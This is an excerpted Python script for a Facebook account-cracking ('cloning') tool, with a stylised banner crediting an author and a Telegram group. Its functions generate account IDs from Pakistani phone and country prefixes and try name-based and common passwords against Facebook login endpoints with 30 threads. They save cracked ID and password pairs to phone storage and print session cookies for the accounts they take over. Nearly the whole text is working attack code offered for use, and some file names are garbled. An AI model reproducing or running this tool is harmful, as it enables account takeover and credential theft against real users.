...
`------' `--' `--'`-------' `--' '--' 
                                      ⠀⠀⠀⠀⠀   
\033[1;37m╔\033[1;36m🅐🅖🅛 𖡟\033[1;37m═══════════════════\033[1;36m🅐🅖🅛 𖡟✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36m🅐🅖🅛 𖡟\033[1;37m╗
\033[1;31m│\033[1;37m🅐🅖🅛 𖡟  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32m​BADR🔥 𖣱        \033[1;31m│
\033[1;31m│\033[1;37m🅐🅖🅛 𖡟  \033[1;32m TELEGRAM  \033[1;31m➟   \033[1;32mTEAM@F4_K4  \033[1;31m│
\033[1;31m│\033[1;37m🅐🅖🅛 𖡟  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m ​يﻮـﻗ ﻲـﺋﺍﻮﺸــﻋ ﺪـﻴـﺻ      \033[1;31m │
\033[1;31m│\033[1;37m🅐🅖🅛 𖡟 \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32m        ​ │ﻲﺒـﻴـﻟ ﺪـﻴـﺻ 👍🏿🙂
\033[1;31m│\033[1;37m🅐🅖🅛 𖡟 \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   │
\033[1;31m│\033[1;37m🅐🅖🅛 𖡟  \033[1;32mGROUP\033[1;31m : \033[1;3https://t.me/follu_anany\033[1;37m {\033[1;36mAGL\033[1;37m} \033[1;31m│
\033[1;37m╚\033[1;36m🅐🅖🅛 𖡟\033[1;37m══════\033[41m\033[1;37m[ 𓆩​BADR 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪  𓆩𝐅𝐎𝐑𝐂𝐄𓆪 ]\x1b[0m══════\033[1;36m🅐🅖🅛 𖡟\033[1;37m╝
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱-81.txt')
...
def main():
    ...
    print(logo)
    print('           \x1b[97m[\033[37;41m  ​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱  \033[0;m] ')
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO ​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱 TOOL \033[0;m] ")
    print(f" {WHITE}TODAY DATE     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
    print(f" {WHITE}USER NAME      : {BLUE}"+NameX)
    print(f"{BLUE}══════════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}يﻮـﻗ ﻲـﺋﺍﻮﺸــﻋ ﺪـﻴـﺻ ")
    print(f"{RED}[02] {WHITE}يﺩﺎـﻋ ﻒـﻠـــــﻣ ﺪـﻴـﺻ")
    print(f"{RED}[03] {WHITE}يﺩﺎـﻋ ﻒـﻠـــــﻣ ﺪـﻴـﺻ  ")
    print(f"{RED}[04] {WHITE}يﺩﺎـﻋ ﻒـﻠـــــﻣ ﺪـﻴـﺻ  ")
    print(f"{RED}[00] {WHITE}هﺍﺩﻻﺍ ﻦـﻣ جﻭﺮـﺧ")
    linex()
    HAMII = input("[√] CHOOSE : ")
    if HAMII in ["1","01"]: 
        passx()
...
def file_crack():
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱_OK.txt\n[•] CP IDS SAVE : /sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio ​AGL_OK.mp3")
                print('\r\033[1;32m[​AGL-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio ​AGL_2F.mp3")
                    print('\r\033[1;35m[​AGL-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio ​AGL_CP.mp3")
                    print('\r\033[1;31m[​AGL-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/​AGL_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio ​AGL_OK.mp3")
                print('\r\033[1;32m[​AGL-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/​AGL_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio ​AGL_2F.mp3")
                    print('\r\033[1;35m[​AGL-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/​AGL2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio ​AGL _CP.mp3")
                    print('\r\033[1;31m[​AGL-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    print('\r\033[1;92m[​AGL-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/​AGL_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio ​AGL_2F.mp3")
                        print('\r\033[1;95m[​AGL-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸?? 𖣱_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                            ...
                            os.system("play-audio ​AGL_CP.mp3")
                            print('\r\033[1;94m[​AGL-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def convert(cookie):
    ...
    res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
        'user-agent'     :     'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5810.201 Safari/537.36',
...
print("آﺮـﻤــﺍ ﺲـﻴــﻟﻭ ﻼـﻀــﻓ ﺪـﻴـﺼﻟﺍ رﻮـﺻ بﺎـﺒـﺷﺎـﻳ ﻲـﻫﻼـﺑ ")
print("")
NameX =input('\x1b[38;5;46m [•] \x1b[38;5;46m ﻲـﻘـﻳﺪـﺻﺎـﻳ ﻚـﻤـﺳﺍ ﻞـﺧﺩﺍ: ')
...
def pass1():
    ...
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : 21892, 21891, 21893, 21894')
    ...
    linex()
    code = input(' ﻲـﻘـﻳﺪـﺻﺎـﻳ ﺔـﻟﻭﺪـﻟﺍ دﻮـﻛ ﻞــﺧﺩﺍ : ')
    os.system("clear")
    print(logo)
    print(f"")
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,"00998877","qwertyuiopasdfghjkl","09870987","77889900","091091091","092092092","22446688"," ١٢٣٤٥٦٧٨","١٢٣٤٥٦"]  
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱-CP.txt')
...
def pass2():
    ...
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 21894 / 21893 / 21891 /21892   \033[0;m]")
    linex()
    code = input(' ﻲـﻘـﻳﺪـﺻﺎـﻳ ﺔـﻟﻭﺪـﻟﺍ دﻮـﻛ ﻞــﺧﺩﺍ: ')
    os.system("clear")
    print(logo)
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}تﺎـﻳﺪـﻳﻻﺍ دﺪـﻋ        : {BLUE}["+tl+"] ~> P2 ")
        print(f" {WHITE}ﻚـﻤـــــﺳﺍ            : {BLUE}"+NameX)
        print(f" {WHITE}ﺔـﻟﻭﺪﻟﺍ دﻮــــﻛ       : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
...
def pass3():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}تﺎـﻳﺪـﻳﻻﺍ دﺪـﻋ           : {BLUE}["+tl+"] ~> P3 ")
        print(f" {WHITE}ﻚـﻤـــــﺳﺍ          : {BLUE}"+NameX)
        print(f" {WHITE}ﺔـﻟﻭﺪﻟﺍ دﻮــــﻛ       : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
...
def pass4():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}تﺎـﻳﺪـﻳﻻﺍ دﺪـﻋ         : {BLUE}["+tl+"] ~> P4 ")
        print(f" {WHITE}ﻚـﻤـــــﺳﺍ            : {BLUE}"+NameX)
        print(f" {WHITE}ﺔـﻟﻭﺪﻟﺍ دﻮــــﻛ        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
...
def pass5():
    ...
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK   21894 / 21893 / 21891 /21892   \033[0;m]")
    linex()
    code = input(' ﻲـﻘـﻳﺪـﺻﺎـﻳ ﺔـﻟﻭﺪـﻟﺍ دﻮـﻛ ﻞــﺧﺩﺍ : ')
    os.system("clear")
    print(logo)
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}تﺎـﻳﺪـﻳﻻﺍ دﺪـﻋ         : {BLUE}["+tl+"] ~> P5 ")
        print(f" {WHITE}ﻚـﻤـــــﺳﺍ          : {BLUE}"+NameX)
        print(f" {WHITE}ﺔـﻟﻭﺪﻟﺍ دﻮــــﻛ     : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
...
def pass6():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}تﺎـﻳﺪـﻳﻻﺍ دﺪـﻋ          : {BLUE}["+tl+"] ~> P6 ")
        print(f" {WHITE} ﻚـﻤـــــﺳﺍ            : {BLUE}"+NameX)
        print(f" {WHITE} ﺔـﻟﻭﺪﻟﺍ دﻮــــﻛ      : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
             'user-agent':pro,} 
            lo = session.post(    'https://business.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&zero_e=2&zero_et=1704659772&refsrc=deprecated&_rdc=2&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ '  ') 
                print(f"\r\rCOOKIE "+coki)
                cek_apk(session,coki)
                open('/sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print(f"\r\rCOOKIE "+uoki)
                    open('/sdcard/​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    ...
                    print(f"\r\rCOOKIE "+coki)
                    open('/sdcard/​AGL-CP.txt', 'a').write(cid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[​𝑄𝑂𝑆𝐼 𝐴𝐿𝐴𝐺𝐸𝐸𝐿 𖣱 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
